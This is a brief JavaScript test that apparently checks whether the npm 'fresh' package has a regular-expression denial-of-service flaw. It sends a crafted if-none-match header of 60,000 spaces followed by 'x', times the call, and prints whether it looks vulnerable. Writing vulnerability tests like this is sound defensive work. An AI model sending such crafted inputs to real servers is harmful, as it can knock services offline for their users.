// test("ReDos in fresh", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  var fresh = require("fresh");
  let str = genstr(60000, " ") + "x";
  let t = measureTime(function () {
    fresh({ "if-none-match": str }, { etag: 23 });
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
